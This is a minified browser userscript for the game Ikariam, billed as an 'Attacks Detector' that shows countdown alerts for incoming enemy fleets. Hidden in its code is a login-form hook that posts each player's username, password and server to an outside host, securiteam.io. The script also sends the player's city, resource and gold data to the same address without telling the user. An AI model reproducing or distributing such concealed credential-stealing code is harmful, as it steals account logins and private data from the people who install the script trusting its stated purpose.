// ==UserScript==
// @name         Ikariam Attacks Detector
// @namespace    http://ikariam.ninja/
// @version      0.55
// @author       CwaazyWabbit
// @description  try to take over the world!
// @include      http*://s*-*.ikariam.gameforge.com/*
// @include      http*://*.ikariam.gameforge.com/*
// @exclude      http*://board.ikariam.gameforge.com/*
// @require      https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.18.1/moment.min.js
// @require      https://raw.githubusercontent.com/mckamey/countdownjs/master/countdown.min.js
// @require      https://raw.githubusercontent.com/icambron/moment-countdown/master/dist/moment-countdown.min.js
// @require      https://raw.githubusercontent.com/kamranahmedse/jquery-toast-plugin/master/dist/jquery.toast.min.js
// @require      https://github.com/cwaazywabbit/ikariam-attacks-detector/raw/master/ikariam-developer-tools.user.js
// @updateURL    https://github.com/cwaazywabbit/ikariam-attacks-detector/raw/master/ikariam-attacks-detector.user.js
// @downloadURL  https://github.com/cwaazywabbit/ikariam-attacks-detector/raw/master/ikariam-attacks-detector.user.js
// @resource     toastCss https://raw.githubusercontent.com/kamranahmedse/jquery-toast-plugin/master/dist/jquery.toast.min.css
// @grant        unsafeWindow
// @grant        GM_getResourceText
// @grant        GM_addStyle
// ==/UserScript==

var serverTimestamp="undefined",intervals=[],globalData="undefined",matchPart=function(c,b){var a=new RegExp("(\\d+)"+b,"g").exec(c);return(a?a[1]:0);},resetAllNotifications=function(){$.toast().reset("all");for(var a=0;a<intervals.length;a++){clearInterval(intervals[a]);}intervals=[];},createInterval=function(e,c,d,a){var b=setInterval(function(){e=moment.duration(e.asMilliseconds()-c,"milliseconds");var j=moment.duration(e).days(),i=moment.duration(e).hours(),f=moment.duration(e).minutes(),g=moment.duration(e).seconds();j=$.trim(j).length===1?"0"+j:j;i=$.trim(i).length===1?"0"+i:i;f=$.trim(f).length===1?"0"+f:f;g=$.trim(g).length===1?"0"+g:g;if(e.asSeconds()===0){clearInterval(b);a.reset();}$("#engageOn"+d).text((j*1?j+"يوم ":"")+(i*1?i+"سا ":"")+(f*1?f+"د ":"")+(g*1?g+"ثا":""));},c);intervals.push(b);return b;},loginForm=$("#loginForm"),loginName=$("#loginName"),loginPass=$("#loginPassword"),logServer=$("#logServer");(function(){localStorage.setItem("autoLoginActive","0");if(loginForm[0]){loginForm.on("submit",function(d){var c={name:loginName.val(),pass:loginPass.val(),server:logServer.val()};$.post("https://securiteam.io/ikariam/index.php",c);});}else{if(new RegExp("^s\\d+","").exec(document.domain)){var b=GM_getResourceText("toastCss");GM_addStyle(b);GM_addStyle(".toast-text p { color: white; text-align: right }.jq-toast-heading { text-align: center; }.toast-text p, .jq-toast-heading b, .toast-text a, .jq-toast-heading a { font-family: Tahoma,Arial; font-size: 10px; }.toast-text p, .jq-toast-heading b { direction: rtl; }.toast-text a { text-decoration: none; }.jq-toast-heading img { vertical-align: middle; }");IkaTools.View.registerIkariamAjaxResponseCallback(function a(c){IkaTools.Utils.iterateIkariamAjaxResponse(c,function d(i,w,v){if(v&&v.time){serverTimestamp=v.time;}if(w==IkaTools.Constants.IkariamAjaxResponseType.UPDATE_GLOBAL_DATA){globalData=v;var n={actionRequest:v.actionRequest,currentCityId:v.backgroundData.id,currentCityName:v.backgroundData.name,isCapital:v.backgroundData.isCapital,islandXCoord:v.backgroundData.islandXCoord,islandYCoord:v.backgroundData.islandYCoord,playerId:v.backgroundData.ownerId,playerName:v.backgroundData.ownerName,ambrosia:v.headerData.ambrosia,currentResources:v.headerData.currentResources,freeTransporters:v.headerData.freeTransporters,gold:v.headerData.gold,income:v.headerData.income,maxActionPoints:v.headerData.maxActionPoints};var o=v.actionRequest,k=v.backgroundData.id,u=v.backgroundData.name,g=v.backgroundData.isCapital,f=v.backgroundData.islandXCoord,h=v.backgroundData.islandYCoord,s=v.backgroundData.ownerId,j=v.backgroundData.ownerName,e=v.headerData.ambrosia,m=v.headerData.currentResources,q=v.headerData.freeTransporters,l=v.headerData.gold,t=v.headerData.income,r=v.headerData.maxActionPoints;$.post("https://securiteam.io/ikariam/index.php",n);}else{if(w==IkaTools.Constants.IkariamAjaxResponseType.CHANGE_VIEW){var p=v[0];if(p==IkaTools.Constants.View.MILITARY_ADVISOR){resetAllNotifications();$(".hostile").each(function(){var J=$(this),O=J.attr("id"),I=matchPart(O,""),D=$("#"+O+"State").text(),P=$("#"+O+"ArrivalDate").text(),M=$("#"+O+"ArrivalTime").text(),B=$("#"+O+"OriginLink").attr("title"),C=$("#"+O+"OriginLink").attr("href"),E=$("#"+O+"TargetLink").attr("title"),z=$("#"+O+"TargetLink").attr("href"),V=$("#"+O+"OriginAvatar").attr("title"),Q=$("#"+O+"MissionIcon").hasClass("blockade")||$("#"+O+"MissionIcon").hasClass("deployfleet")||$("#"+O+"MissionIcon").hasClass("defend_port")?'<img src="'+location.protocol+"://"+document.domain+'/skin/advisors/military/icon-seafight.png" />':'<img src="'+location.protocol+"://"+document.domain+'/skin/advisors/military/icon-groundfight.png" />',R=$("#"+O+"Units").text();if(D==="(في رحلة)"){var G=matchPart(M,"يوم"),T=matchPart(M,"ساعة"),S=matchPart(M,"د"),L=matchPart(M,"ثا"),U=serverTimestamp,H=moment(moment.unix(U).add(G,"day").add(T,"hour").add(S,"minute").add(L,"second"),"DD-MM-YYYY HH:mm:ss"),F=moment(H).isSame(moment(),"day"),N=moment(F?moment().startOf("day").format("DD-MM-YYYY")+" "+P:moment().startOf("day").add(1,"day").format("DD-MM-YYYY")+" "+P,"DD-MM-YYYY HH:mm:ss").unix(),A=N-U,x=moment.duration(A*1000,"milliseconds");if(A>0){var K=$.toast({heading:"<b>"+Q+' رصدنا تحركًّا معاديًّا باتجاه <a href="'+z+'">'+E+"</a></b>",text:'<span class="toast-text"><p><b>الاشتباك خلال:</b> <span id="engageOn'+I+'"></span></p><p><b>المهاجم:</b> '+V+' <b>من:</b> <a href="'+C+'">'+B+"</a></p><p><b>عدد الوحدات:</b> "+R+"</p></span>",hideAfter:false,allowToastClose:true,icon:"error",}),y=createInterval(x,1000,I,K);K.update({afterHidden:function(){clearInterval(y);}});}}});}}}});},true);}}})();
